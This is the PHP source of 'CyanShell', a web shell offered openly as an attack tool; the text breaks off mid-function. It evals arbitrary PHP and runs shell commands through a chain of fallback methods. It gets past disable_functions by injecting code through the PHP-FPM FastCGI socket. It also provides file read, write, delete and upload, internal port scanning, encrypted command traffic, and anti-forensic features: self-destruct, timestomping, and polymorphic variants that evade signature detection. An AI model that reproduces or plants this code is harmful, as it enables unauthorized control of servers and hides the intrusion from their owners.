<?php
session_start();

/* ═══════════════════════════════════════════════════════════════
 * CyanShell v1.4.0
 *   AES-256-CBC traffic encryption (PBKDF2-SHA256)
 *   FastCGI takeover via PHP-FPM Unix socket
 *   PHP Console with fatal-error recovery
 *   Integrated File Manager
 *   Server-side Port Scanner
 *
 * References:
 *   - Orange Tsai, Black Hat 2019 — "Breaking Parser Logic"
 *   - MITRE ATT&CK T1505.003, T1059.003, T1059.004
 * ═══════════════════════════════════════════════════════════════ */

// ─────────────────────────────────────────────────────────────
//  Crypto primitives (AES-256-CBC + PBKDF2-SHA256)
// ─────────────────────────────────────────────────────────────

function cyan_derive_key(string $pw): string {
    return hash_pbkdf2('sha256', $pw, 'cyanshell-kdf-salt-v1', 100000, 32, true);
}

function cyan_encrypt(string $pt, string $key): string {
    if (!function_exists('openssl_encrypt')) return '';
    $iv = random_bytes(16);
    $ct = @openssl_encrypt($pt, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return $ct === false ? '' : base64_encode($iv . $ct);
}

function cyan_decrypt(string $b64, string $key): ?string {
    if (!function_exists('openssl_decrypt')) return null;
    $raw = base64_decode($b64, true);
    if ($raw === false || strlen($raw) < 17) return null;
    $pt = @openssl_decrypt(substr($raw, 16), 'AES-256-CBC', $key, OPENSSL_RAW_DATA, substr($raw, 0, 16));
    return $pt === false ? null : $pt;
}

// Crypto session handler — runs before any other POST parsing
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['__set_key']) && is_string($_POST['__set_key']) && $_POST['__set_key'] !== '') {
        $_SESSION['cyan_key'] = cyan_derive_key($_POST['__set_key']);
    }
    if (isset($_POST['__del_key'])) {
        unset($_SESSION['cyan_key']);
    }
    if (isset($_POST['__enc']) && is_string($_POST['__enc']) && !empty($_SESSION['cyan_key'])) {
        $decoded = cyan_decrypt($_POST['__enc'], $_SESSION['cyan_key']);
        if ($decoded !== null) {
            parse_str($decoded, $arr);
            if (is_array($arr)) $_POST = array_merge($_POST, $arr);
        }
    }
}

// ─────────────────────────────────────────────────────────────
//  FastCGI takeover (bypass disable_functions via PHP-FPM)
// ─────────────────────────────────────────────────────────────

function fastcgi_discover_sockets(): array {
    $socks = [];
    if (@is_readable('/proc/net/unix')) {
        $u = @file_get_contents('/proc/net/unix');
        if ($u !== false && preg_match_all('#\s(/[^\s]+fpm[^\s]*\.sock)#i', $u, $m)) {
            foreach ($m[1] as $s) $socks[] = $s;
        }
    }
    $known = [
        '/run/php/php-fpm.sock',
        '/run/php/php7.0-fpm.sock','/run/php/php7.1-fpm.sock',
        '/run/php/php7.2-fpm.sock','/run/php/php7.3-fpm.sock',
        '/run/php/php7.4-fpm.sock','/run/php/php8.0-fpm.sock',
        '/run/php/php8.1-fpm.sock','/run/php/php8.2-fpm.sock',
        '/run/php/php8.3-fpm.sock','/run/php/php8.4-fpm.sock',
        '/var/run/php-fpm/php-fpm.sock','/var/run/php-fpm/www.sock',
        '/var/run/php5-fpm.sock','/tmp/php-fpm.sock',
    ];
    foreach ($known as $p) if (@file_exists($p)) $socks[] = $p;
    $configs = array_merge(
        glob('/etc/php/*/fpm/pool.d/*.conf') ?: [],
        glob('/etc/php-fpm.d/*.conf') ?: [],
        glob('/etc/php-fpm.conf') ?: []
    );
    foreach ($configs as $c) {
        if (!@is_readable($c)) continue;
        $d = @file_get_contents($c);
        if ($d === false) continue;
        if (preg_match_all('#^\s*listen\s*=\s*(\S+)#mi', $d, $m)) {
            foreach ($m[1] as $s) {
                $s = trim($s);
                if (strpos($s, '/') === 0 && @file_exists($s)) $socks[] = $s;
            }
        }
    }
    return array_values(array_unique($socks));
}

function fastcgi_pack_length(int $n): string {
    if ($n < 128) return chr($n);
    return chr(($n >> 24) | 0x80) . chr(($n >> 16) & 0xFF)
         . chr(($n >> 8) & 0xFF)  . chr($n & 0xFF);
}

function fastcgi_pack_param(string $name, string $value): string {
    return fastcgi_pack_length(strlen($name))
         . fastcgi_pack_length(strlen($value))
         . $name . $value;
}

function fastcgi_pack_record(int $type, string $body, int $reqId = 1): string {
    $len = strlen($body);
    $pad = (8 - ($len % 8)) % 8;
    return chr(1) . chr($type)
         . chr(($reqId >> 8) & 0xFF) . chr($reqId & 0xFF)
         . chr(($len >> 8) & 0xFF) . chr($len & 0xFF)
         . chr($pad) . chr(0)
         . $body . str_repeat("\x00", $pad);
}

function fastcgi_send_request(string $sockPath, string $phpCode, float $timeout = 10.0): ?array {
    if (!function_exists('stream_socket_client') || !@file_exists($sockPath)) return null;
    $errno = 0; $errstr = '';
    $fp = @stream_socket_client('unix://' . $sockPath, $errno, $errstr, $timeout);
    if (!$fp) return null;
    stream_set_timeout($fp, (int) $timeout);
    $targets = [
        $_SERVER['SCRIPT_FILENAME'] ?? '',
        rtrim($_SERVER['DOCUMENT_ROOT'] ?? '', '/') . '/index.php',
        '/var/www/html/index.php','/var/www/index.php',
        '/usr/share/php/index.php', __FILE__,
    ];
    $target = '';
    foreach ($targets as $t) if ($t !== '' && @file_exists($t)) { $target = $t; break; }
    $dataUri = 'data://text/plain;base64,' . base64_encode($phpCode);
    $params =
        fastcgi_pack_param('GATEWAY_INTERFACE','FastCGI/1.0') .
        fastcgi_pack_param('REQUEST_METHOD','GET') .
        fastcgi_pack_param('SCRIPT_FILENAME',$target) .
        fastcgi_pack_param('SCRIPT_NAME','/' . basename($target)) .
        fastcgi_pack_param('REQUEST_URI','/' . basename($target)) .
        fastcgi_pack_param('DOCUMENT_ROOT',dirname($target)) .
        fastcgi_pack_param('SERVER_SOFTWARE','cyan/1.4.0') .
        fastcgi_pack_param('REMOTE_ADDR','127.0.0.1') .
        fastcgi_pack_param('SERVER_PROTOCOL','HTTP/1.1') .
        fastcgi_pack_param('CONTENT_TYPE','') .
        fastcgi_pack_param('CONTENT_LENGTH','0') .
        fastcgi_pack_param('PHP_VALUE', "auto_prepend_file=$dataUri\nallow_url_include=On\n") .
        fastcgi_pack_param('PHP_ADMIN_VALUE', "auto_prepend_file=$dataUri\nallow_url_include=On\n");
    $begin = "\x00\x01\x00\x00\x00\x00\x00\x00";
    $payload  = fastcgi_pack_record(1, $begin);
    $payload .= fastcgi_pack_record(4, $params);
    $payload .= fastcgi_pack_record(4, '');
    $payload .= fastcgi_pack_record(5, '');
    if (@fwrite($fp, $payload) === false) { @fclose($fp); return null; }
    $stdout = ''; $stderr = ''; $t0 = microtime(true);
    while (!feof($fp)) {
        if ((microtime(true) - $t0) > $timeout) break;
        $hdr = @fread($fp, 8);
        if ($hdr === false || strlen($hdr) < 8) break;
        $type = ord($hdr[1]);
        $clen = (ord($hdr[4]) << 8) | ord($hdr[5]);
        $plen = ord($hdr[6]);
        $body = $clen > 0 ? (string) @fread($fp, $clen) : '';
        if ($plen > 0) @fread($fp, $plen);
        if ($type === 6) $stdout .= $body;
        elseif ($type === 7) $stderr .= $body;
        elseif ($type === 3) break;
    }
    @fclose($fp);
    $pos = strpos($stdout, "\r\n\r\n");
    if ($pos !== false) $stdout = substr($stdout, $pos + 4);
    return ['stdout' => $stdout, 'stderr' => $stderr];
}

function fastcgi_takeover(string $cmd, string $cwd, float $timeout = 10.0): ?array {
    $socks = fastcgi_discover_sockets();
    if (empty($socks)) return null;
    $phpCode = '<?php '
        . 'if(function_exists("chdir"))@chdir(' . var_export($cwd,true) . ');'
        . '$o="";'
        . 'if(function_exists("shell_exec"))$o=(string)shell_exec(' . var_export($cmd,true) . ');'
        . 'elseif(function_exists("exec")){@exec(' . var_export($cmd,true) . ',$L);$o=implode("\n",$L);}'
        . 'elseif(function_exists("system")){ob_start();@system(' . var_export($cmd,true) . ');$o=ob_get_clean();}'
        . 'elseif(function_exists("passthru")){ob_start();@passthru(' . var_export($cmd,true) . ');$o=ob_get_clean();}'
        . 'else $o="[fastcgi] no exec function in FPM context";'
        . 'echo $o; ?>';
    foreach ($socks as $s) {
        $res = fastcgi_send_request($s, $phpCode, $timeout);
        if ($res !== null && (trim($res['stdout']) !== '' || trim($res['stderr']) !== '')) {
            return [
                'stdout' => $res['stdout'],
                'stderr' => $res['stderr'],
                'method' => 'fastcgi:' . basename($s),
            ];
        }
    }
    return null;
}

// ─────────────────────────────────────────────────────────────
//  PHP Console handler (with fatal-error recovery)
// ─────────────────────────────────────────────────────────────

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['phpcode']) && is_string($_POST['phpcode'])) {
    $php_timeout = isset($_POST['php_timeout']) ? max(1, min(60, (int)$_POST['php_timeout'])) : 10;
    @set_time_limit($php_timeout + 5);
    @ini_set('display_errors', 1);
    @error_reporting(E_ALL);

    $output = '';
    $error_output = '';
    $fatal = null;

    register_shutdown_function(function() use (&$fatal) {
        $e = error_get_last();
        if ($e !== null && in_array($e['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR], true)) {
            $fatal = $e;
        }
    });

    set_error_handler(function($errno, $errstr, $errfile, $errline) use (&$error_output) {
        $error_output .= "[PHP $errno] $errstr in $errfile:$errline\n";
        return true;
    });

    ob_start();
    try {
        $code = preg_replace('/^\s*<\?php\s*/', '', $_POST['phpcode']);
        $code = preg_replace('/\?>\s*$/', '', (string)$code);
        eval($code);
        $output = (string) ob_get_clean();
    } catch (Throwable $t) {
        $output = (string) ob_get_clean();
        $error_output .= "[Exception] " . $t->getMessage() . " in " . $t->getFile() . ":" . $t->getLine() . "\n";
    }

    restore_error_handler();

    if ($fatal !== null) {
        $error_output .= "[Fatal] " . $fatal['message'] . " in " . $fatal['file'] . ":" . $fatal['line'] . "\n";
    }

    $_SESSION['php_console_output'] = $output . ($error_output !== '' ? "\n--- Errors ---\n" . $error_output : '');
    $_SESSION['php_console_code']   = $_POST['phpcode'];

    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?') . '?console=1');
    exit;
}

if (isset($_GET['console']) && $_GET['console'] === '0') {
    unset($_SESSION['php_console_output'], $_SESSION['php_console_code']);
}

// ─────────────────────────────────────────────────────────────
//  File Manager handler
// ─────────────────────────────────────────────────────────────

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fm_action'])) {
    header('Content-Type: application/json');
    $path = (string)($_POST['fm_path'] ?? '');
    $real = $path !== '' ? @realpath($path) : false;
    if ($real === false) $real = $path;

    $action = (string) $_POST['fm_action'];
    $result = ['ok' => false, 'err' => 'unknown action'];

    switch ($action) {
        case 'list':
            if (!is_dir($real)) { $result = ['ok'=>false, 'err'=>'not a directory']; break; }
            $items = [];
            $dh = @opendir($real);
            if ($dh) {
                while (($f = readdir($dh)) !== false) {
                    if ($f === '.' || $f === '..') continue;
                    $full = $real . DIRECTORY_SEPARATOR . $f;
                    $items[] = [
                        'name'     => $f,
                        'type'     => is_dir($full) ? 'dir' : (is_link($full) ? 'link' : 'file'),
                        'size'     => is_file($full) ? filesize($full) : 0,
                        'mtime'    => filemtime($full),
                        'perm'     => substr(sprintf('%o', fileperms($full)), -4),
                        'readable' => is_readable($full),
                        'writable' => is_writable($full),
                    ];
                }
                closedir($dh);
            }
            usort($items, function($a, $b) {
                if ($a['type'] !== $b['type']) return $a['type'] === 'dir' ? -1 : 1;
                return strcasecmp($a['name'], $b['name']);
            });
            $result = ['ok' => true, 'path' => $real, 'items' => $items, 'parent' => dirname($real)];
            break;

        case 'read':
            if (!is_file($real) || !is_readable($real)) { $result = ['ok'=>false, 'err'=>'cannot read']; break; }
            $content = @file_get_contents($real);
            $result = ['ok' => true, 'content' => $content === false ? '' : $content];
            break;

        case 'write':
            if (!is_file($real)) { $result = ['ok'=>false, 'err'=>'not a file']; break; }
            $new = (string)($_POST['fm_content'] ?? '');
            $bytes = @file_put_contents($real, $new);
            $result = ['ok' => $bytes !== false];
            if (!$result['ok']) $result['err'] = 'write failed';
            break;

        case 'delete':
            if (is_dir($real)) $result = ['ok' => @rmdir($real), 'err' => 'rmdir failed'];
            else                $result = ['ok' => @unlink($real), 'err' => 'unlink failed'];
            break;

        case 'rename':
            $new = (string)($_POST['fm_new_name'] ?? '');
            if ($new === '' || strpos($new, '/') !== false || strpos($new, '\\') !== false) {
                $result = ['ok'=>false, 'err'=>'invalid name']; break;
            }
            $target = dirname($real) . DIRECTORY_SEPARATOR . $new;
            $result = ['ok' => @rename($real, $target), 'err' => 'rename failed'];
            break;

        case 'mkdir':
            $new = (string)($_POST['fm_new_name'] ?? '');
            if ($new === '') { $result = ['ok'=>false,'err'=>'empty name']; break; }
            $target = $real . DIRECTORY_SEPARATOR . $new;
            $result = ['ok' => @mkdir($target, 0755), 'err' => 'mkdir failed'];
            break;

        case 'chmod':
            $mode = (int)($_POST['fm_mode'] ?? 0644);
            $result = ['ok' => @chmod($real, $mode), 'err' => 'chmod failed'];
            break;

        case 'download':
            if (!is_file($real) || !is_readable($real)) {
                http_response_code(404); exit('not found');
            }
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($real) . '"');
            header('Content-Length: ' . filesize($real));
            @readfile($real);
            exit;

        case 'upload':
            if (!isset($_FILES['fm_file'])) { $result = ['ok'=>false,'err'=>'no file']; break; }
            $target = $real . DIRECTORY_SEPARATOR . basename($_FILES['fm_file']['name']);
            $result = ['ok' => @move_uploaded_file($_FILES['fm_file']['tmp_name'], $target)];
            if (!$result['ok']) $result['err'] = 'upload failed';
            break;
    }

    echo json_encode($result);
    exit;
}

// ─────────────────────────────────────────────────────────────
//  Port Scanner handler
// ─────────────────────────────────────────────────────────────

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['scan_target']) && is_string($_POST['scan_target'])) {
    header('Content-Type: application/json');

    $target     = trim($_POST['scan_target']);
    $ports_str  = (string)($_POST['scan_ports']   ?? '22,80,443,3306,8080');
    $timeout    = max(1, min(10, (float)($_POST['scan_timeout'] ?? 2)));
    $grab       = !empty($_POST['scan_banner']);

    $ports = [];
    foreach (explode(',', $ports_str) as $p) {
        $p = trim($p);
        if (strpos($p, '-') !== false) {
            [$a, $b] = array_pad(explode('-', $p, 2), 2, '');
            $a = (int)$a; $b = (int)$b;
            if ($a > 0 && $b >= $a && ($b - $a) < 1000) {
                for ($i = $a; $i <= $b; $i++) $ports[] = $i;
            }
        } elseif (ctype_digit($p)) {
            $i = (int)$p;
            if ($i > 0 && $i < 65536) $ports[] = $i;
        }
    }
    $ports = array_values(array_unique($ports));

    if (empty($ports)) { echo json_encode(['ok'=>false,'err'=>'no valid ports']); exit; }

    $ip = $target;
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        $resolved = @gethostbyname($target);
        if ($resolved !== $target) $ip = $resolved;
    }

    $results = [];
    @set_time_limit(180);

    foreach (array_chunk($ports, 50) as $batch) {
        $sockets = [];
        foreach ($batch as $port) {
            $errno = 0; $errstr = '';
            $sock = @stream_socket_client(
                "tcp://$ip:$port",
                $errno, $errstr, $timeout,
                STREAM_CLIENT_CONNECT | STREAM_CLIENT_ASYNC_CONNECT
            );
            if ($sock !== false) {
                stream_set_blocking($sock, false);
                $sockets[$port] = $sock;
            }
        }

        $write = array_values($sockets);
        $read = null; $except = null;
        $ready = @stream_select($read, $write, $except, (int)$timeout, 0);

        if ($ready !== false && $ready > 0) {
            foreach ($write as $sock) {
                $port = array_search($sock, $sockets, true);
                if ($port === false) continue;

                // Verify actual connection — async connect reports writable on error too
                $peer = @stream_socket_get_name($sock, true);
                if ($peer === false) continue;

                $banner = '';
                if ($grab) {
                    stream_set_blocking($sock, true);
                    stream_set_timeout($sock, 2);
                    @fwrite($sock, "HEAD / HTTP/1.0\r\nHost: $ip\r\n\r\n");
                    $more = @fread($sock, 512);
                    if ($more !== false && $more !== '') $banner = trim(substr($more, 0, 200));
                }

                $results[] = ['port' => $port, 'state' => 'open', 'banner' => $banner];
            }
        }

        foreach ($sockets as $sock) @fclose($sock);
    }

    usort($results, function($a, $b) { return $a['port'] - $b['port']; });
    echo json_encode(['ok'=>true, 'target'=>$ip, 'scanned'=>count($ports), 'results'=>$results]);
    exit;
}

// ─────────────────────────────────────────────────────────────
//  §3 — Advanced Ops (Phase 3)
//    §3.1 Self-destruct — wipe and delete this file
//    §3.2 Timestomp — match mtime/atime with a sibling file
//    §3.3 Polymorphic build — emit a randomized variant
// ─────────────────────────────────────────────────────────────

// §3.1 — Self-Destruct
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && ($_POST['ops'] ?? '') === 'self_destruct') {
    header('Content-Type: application/json');
    if (($_POST['confirm'] ?? '') !== 'CONFIRM') {
        echo json_encode(['ok' => false, 'err' => 'confirmation required']);
        exit;
    }
    $self = __FILE__;
    // Overwrite with null bytes to defeat naive recovery
    @file_put_contents($self, str_repeat("\x00", 4096));
    @unlink($self);
    $_SESSION = [];
    if (function_exists('session_destroy')) @session_destroy();
    echo json_encode(['ok' => !file_exists($self)]);
    exit;
}

// §3.2 — Timestomp (dual mode: auto sibling OR manual input)
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && ($_POST['ops'] ?? '') === 'timestomp') {
    header('Content-Type: application/json');

    $mode = (string)($_POST['mode'] ?? 'auto');

    // ── Mode: Manual ─────────────────────────────────────
    if ($mode === 'manual') {
        $input_mtime = trim((string)($_POST['mtime'] ?? ''));
        $input_atime = trim((string)($_POST['atime'] ?? ''));

        if ($input_atime === '') $input_atime = $input_mtime;   // atime defaults to mtime

        if ($input_mtime === '') {
            echo json_encode(['ok' => false, 'err' => 'no timestamp provided']);
            exit;
        }

        $m_ts = @strtotime($input_mtime);
        $a_ts = @strtotime($input_atime);

        if ($m_ts === false || $m_ts < 0) {
            echo json_encode(['ok' => false, 'err' => "invalid mtime: '$input_mtime'"]);
            exit;
        }
        if ($a_ts === false || $a_ts < 0) {
            echo json_encode(['ok' => false, 'err' => "invalid atime: '$input_atime'"]);
            exit;
        }
        if ($m_ts > time() + 86400) {
            echo json_encode(['ok' => false, 'err' => 'mtime is in the future']);
            exit;
        }

        $ok = @touch(__FILE__, $m_ts, $a_ts);
        echo json_encode([
            'ok'        => (bool) $ok,
            'mode'      => 'manual',
            'mtime'     => $m_ts,
            'atime'     => $a_ts,
            'mtime_str' => date('Y-m-d H:i:s', $m_ts),
            'atime_str' => date('Y-m-d H:i:s', $a_ts),
        ]);
        exit;
    }

    // ── Mode: Auto (default) ─────────────────────────────
    $dir = dirname(__FILE__);
    $ref_mtime = null; $ref_atime = null; $ref_file = null;
    $cands = @scandir($dir);
    if (is_array($cands)) {
        shuffle($cands);
        foreach ($cands as $c) {
            if ($c === '.' || $c === '..') continue;
            $p = $dir . DIRECTORY_SEPARATOR . $c;
            if (!is_file($p) || $p === __FILE__) continue;
            $ext = strtolower(pathinfo($c, PATHINFO_EXTENSION));
            if (in_array($ext, ['php','html','htm','txt','js','css','json'], true)) {
                $m = @filemtime($p);
                $a = @fileatime($p);
                if ($m !== false) {
                    $ref_mtime = $m;
                    $ref_atime = ($a !== false) ? $a : $m;
                    $ref_file  = $c;
                    break;
                }
            }
        }
    }
    if ($ref_mtime === null) {
        $ref_mtime = time() - random_int(86400 * 7, 86400 * 45);
        $ref_atime = $ref_mtime - random_int(0, 3600);
        $ref_file  = '(fallback: random past date)';
    }
    $ok = @touch(__FILE__, $ref_mtime, $ref_atime);
    echo json_encode([
        'ok'        => (bool) $ok,
        'mode'      => 'auto',
        'ref'       => $ref_file,
        'mtime'     => $ref_mtime,
        'atime'     => $ref_atime,
        'mtime_str' => date('Y-m-d H:i:s', $ref_mtime),
        'atime_str' => date('Y-m-d H:i:s', $ref_atime),
    ]);
    exit;
}

// §3.3 — Polymorphic Build
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && ($_POST['ops'] ?? '') === 'polybuild') {
    $src = @file_get_contents(__FILE__);
    if ($src === false) { http_response_code(500); exit('cannot read source'); }

    $suffix = substr(bin2hex(random_bytes(5)), 0, 10);

    // Identifier remapping — order-independent because names are disjoint
    $map = [
        'cyan_derive_key'        => 'k'   . $suffix,
        'cyan_encrypt'           => 'en'  . $suffix,
        'cyan_decrypt'           => 'de'  . $suffix,
        'fastcgi_'               => 'fc'  . $suffix . '_',
        'detect_os_family'       => 'os'  . $suffix,
        'fn_available'           => 'fn'  . $suffix,
        'test_exec_method'       => 'tx'  . $suffix,
        'run_command'            => 'rc'  . $suffix,
        'cyanshell-kdf-salt-v1'  => 'kdf-' . $suffix,
    ];
    $src = str_replace(array_keys($map), array_values($map), $src);

    // Fingerprint + junk comment
    $fp = hash('sha256', $suffix . microtime(true) . random_bytes(8));
    $tag = '<' . '?' . 'php';
    if (substr($src, 0, 5) === $tag) {
        $junk = str_repeat('/*' . $suffix . '*/', random_int(2, 6));
        $header = $tag . "\n"
                . "/*\n"
                . " * CyanShell variant {$suffix}\n"
                . " * SHA-256 seed: {$fp}\n"
                . " * Generated:    " . date('c') . "\n"
                . " */\n"
                . $junk . "\n";
        $src = $header . substr($src, 5);
    }

    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="cyanshell-' . $suffix . '.php"');
    echo $src;
    exit;
}

// ─────────────────────────────────────────────────────────────
//  OS family detection
// ─────────────────────────────────────────────────────────────

function detect_os_family(): string {
    if (function_exists('php_uname')) {
        $uname = @php_uname('s');
        if (is_string($uname) && $uname !== '') {
            $u = strtolower($uname);
            if (strpos($u, 'darwin') !== false)  return 'Darwin';
            if (strpos($u, 'windows') !== false) return 'Windows';
            if (strpos($u, 'linux') !== false)   return 'Linux';
            if (strpos($u, 'bsd') !== false)     return 'BSD';
            if (strpos($u, 'sunos') !== false)   return 'Solaris';
        }
    }
    if (defined('PHP_OS_FAMILY') && PHP_OS_FAMILY !== 'Unknown') return PHP_OS_FAMILY;
    if (defined('PHP_OS')) {
        $o = strtoupper(PHP_OS);
        if (strpos($o, 'WIN') !== false) return 'Windows';
        if (strpos($o, 'LINUX') !== false) return 'Linux';
        if (strpos($o, 'BSD') !== false) return 'BSD';
        if (strpos($o, 'DARWIN') !== false || strpos($o, 'MAC') !== false) return 'Darwin';
    }
    return 'Unknown';
}

$os_family = detect_os_family();
$is_win    = ($os_family === 'Windows');

if (!isset($_SESSION['cwd']))     $_SESSION['cwd'] = getcwd();
if (!isset($_SESSION['history'])) $_SESSION['history'] = [];

$cwd = $_SESSION['cwd'];
$cmd = '';
$out = '';

// ─────────────────────────────────────────────────────────────
//  Pre-flight: detect available execution functions
// ─────────────────────────────────────────────────────────────

$disabled_list = array_map('trim', explode(',', (string) ini_get('disable_functions')));
$disabled_list = array_values(array_filter($disabled_list));

function fn_available(string $name, array $disabled): bool {
    if (!function_exists($name)) return false;
    if (in_array($name, $disabled, true)) return false;
    return @is_callable($name);
}

function test_exec_method(string $method): array {
    $marker = '__cyanshell_probe__';
    $probe  = 'echo ' . $marker;
    $is_win = (detect_os_family() === 'Windows');

    try {
        switch ($method) {
            case 'proc_open':
                $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
                $cmd_arr = $is_win ? ['cmd.exe', '/c', $probe] : ['/bin/sh', '-c', $probe];
                $proc = @proc_open($cmd_arr, $desc, $pipes);
                if (!is_resource($proc)) return [false, 'proc_open returned non-resource'];
                fclose($pipes[0]);
                stream_set_blocking($pipes[1], false);
                stream_set_blocking($pipes[2], false);
                $so = ''; $start = microtime(true);
                while (true) {
                    $st = proc_get_status($proc);
                    $so .= (string) stream_get_contents($pipes[1]);
                    if (!$st['running']) break;
                    if ((microtime(true) - $start) > 5) { proc_terminate($proc); break; }
                    usleep(20000);
                }
                $so .= (string) stream_get_contents($pipes[1]);
                fclose($pipes[1]); fclose($pipes[2]);
                proc_close($proc);
                return [strpos($so, $marker) !== false, trim($so) ?: 'no output'];

            case 'shell_exec':
                $out = (string) @shell_exec($probe);
                return [strpos($out, $marker) !== false, trim($out) ?: 'no output'];

            case 'system':
                ob_start(); @system($probe); $out = (string) ob_get_clean();
                return [strpos($out, $marker) !== false, trim($out) ?: 'no output'];

            case 'passthru':
                ob_start(); @passthru($probe); $out = (string) ob_get_clean();
                return [strpos($out, $marker) !== false, trim($out) ?: 'no output'];

            case 'exec':
                $lines = []; @exec($probe, $lines); $out = implode("\n", $lines);
                return [strpos($out, $marker) !== false, trim($out) ?: 'no output'];

            case 'backtick':
                $out = (string) @`$probe`;
                return [strpos($out, $marker) !== false, trim($out) ?: 'no output'];

            case 'popen':
                $h = @popen($probe, 'r');
                if (!is_resource($h)) return [false, 'popen returned non-resource'];
                $out = '';
                while (!feof($h)) $out .= fread($h, 4096);
                pclose($h);
                return [strpos($out, $marker) !== false, trim($out) ?: 'no output'];
        }
    } catch (Throwable $e) {
        return [false, $e->getMessage()];
    }
    return [false, 'unknown method'];
}

$all_methods   = ['proc_open', 'shell_exec', 'system', 'passthru', 'exec', 'backtick', 'popen'];
$method_status = [];
$available     = [];

foreach ($all_methods as $m) {
    $fn = ($m === 'backtick') ? 'shell_exec' : $m;
    if (!fn_available($fn, $disabled_list)) {
        $method_status[$m] = ['ok' => false, 'reason' => 'disabled or unavailable'];
        continue;
    }
    [$ok, $info] = test_exec_method($m);
    $method_status[$m] = ['ok' => $ok, 'reason' => $info];
    if ($ok) $available[] = $m;
}

$exec_method = $available[0] ?? null;

// ─────────────────────────────────────────────────────────────
//  Universal runner with fallback chain
// ─────────────────────────────────────────────────────────────

function run_command(string $cmd, string $cwd, array $available, float $timeout = 15.0): array {
    $is_win = (detect_os_family() === 'Windows');

    $cd_prefix = $is_win
        ? 'cd /d "' . str_replace('"', '""', $cwd) . '" && '
        : 'cd ' . escapeshellarg($cwd) . ' && ';

    $runners = [];

    if (in_array('proc_open', $available, true)) {
        $runners['proc_open'] = function() use ($cmd, $cwd, $is_win, $timeout) {
            $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
            $cmd_arr = $is_win ? ['cmd.exe', '/c', $cmd] : ['/bin/sh', '-c', $cmd];
            $proc = @proc_open($cmd_arr, $desc, $pipes, $cwd, null, ['bypass_shell' => true]);
            if (!is_resource($proc)) return null;
            fclose($pipes[0]);
            stream_set_blocking($pipes[1], false);
            stream_set_blocking($pipes[2], false);
            $so = ''; $se = ''; $start = microtime(true);
            while (true) {
                $st = proc_get_status($proc);
                $so .= (string) stream_get_contents($pipes[1]);
                $se .= (string) stream_get_contents($pipes[2]);
                if (!$st['running']) break;
                if ((microtime(true) - $start) > $timeout) {
                    proc_terminate($proc);
                    $se .= "\n[timeout] command exceeded {$timeout}s";
                    break;
                }
                usleep(50000);
            }
            $so .= (string) stream_get_contents($pipes[1]);
            $se .= (string) stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($proc);
            return ['stdout' => $so, 'stderr' => $se, 'method' => 'proc_open'];
        };
    }

    if (in_array('shell_exec', $available, true)) {
        $runners['shell_exec'] = function() use ($cmd, $cd_prefix) {
            $out = (string) @shell_exec($cd_prefix . $cmd . ' 2>&1');
            return ['stdout' => $out, 'stderr' => '', 'method' => 'shell_exec'];
        };
    }

    if (in_array('system', $available, true)) {
        $runners['system'] = function() use ($cmd, $cd_prefix) {
            ob_start(); @system($cd_prefix . $cmd . ' 2>&1');
            $out = (string) ob_get_clean();
            return ['stdout' => $out, 'stderr' => '', 'method' => 'system'];
        };
    }

    if (in_array('passthru', $available, true)) {
        $runners['passthru'] = function() use ($cmd, $cd_prefix) {
            ob_start(); @passthru($cd_prefix . $cmd . ' 2>&1');
            $out = (string) ob_get_clean();
            return ['stdout' => $out, 'stderr' => '', 'method' => 'passthru'];
        };
    }

    if (in_array('exec', $available, true)) {
        $runners['exec'] = function() use ($cmd, $cd_prefix) {
            $lines = []; @exec($cd_prefix . $cmd . ' 2>&1', $lines);
            return ['stdout' => implode("\n", $lines), 'stderr' => '', 'method' => 'exec'];
        };
    }

    if (in_array('backtick', $available, true)) {
        $runners['backtick'] = function() use ($cmd, $cd_prefix) {
            $out = (string) @`{$cd_prefix}{$cmd} 2>&1`;
            return ['stdout' => $out, 'stderr' => '', 'method' => 'backtick'];
        };
    }

    if (in_array('popen', $available, true)) {
        $runners['popen'] = function() use ($cmd, $cd_prefix) {
            $h = @popen($cd_prefix . $cmd . ' 2>&1', 'r');
            if (!is_resource($h)) return null;
            $out = '';
            while (!feof($h)) $out .= fread($h, 4096);
            pclose($h);
            return ['stdout' => $out, 'stderr' => '', 'method' => 'popen'];
        };
    }

    foreach ($available as $m) {
        if (!isset($runners[$m])) continue;
        try {
            $result = $runners[$m]();
            if ($result !== null) return $result;
        } catch (Throwable $e) {
            continue;
        }
    }

    if (detect_os_family() === 'Linux') {
        $fcgi = fastcgi_takeover($cmd, $cwd, $timeout);
        if ($fcgi !== null) return $fcgi;
    }

    return ['stdout' => '', 'stderr' => 'all execution methods failed', 'method' => 'none'];
}

// ─────────────────────────────────────────────────────────────
//  Main command execution
// ─────────────────────────────────────────────────────────────

if (
    $_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_POST['cmd'])
    && is_string($_POST['cmd'])
    && trim($_POST['cmd']) !== ''
) {
    $cmd = trim($_POST['cmd']);
    $_SESSION['history'][] = $cmd;
    if (count($_SESSION['history']) > 100) {
        $_SESSION['history'] = array_slice($_SESSION['history'], -100);
    }

    if (preg_match('/^cd(?:\s+(.+))?$/i', $cmd, $m)) {
        $target = isset($m[1]) ? trim($m[1], " \t\"'") : '';
        if ($target === '' || $target === '~') {
            $target = $is_win ? getenv('USERPROFILE') : getenv('HOME');
        }
        if ($target !== '' && !preg_match('/^([A-Za-z]:|\/|\\\\)/', $target)) {
            $target = $cwd . DIRECTORY_SEPARATOR . $target;
        }
        $real = @realpath($target);
        if ($real && is_dir($real)) {
            $_SESSION['cwd'] = $real;
            $cwd = $real;
            $out = "[cd] -> $real";
        } else {
            $out = "[cd] Directory not found: $target";
        }
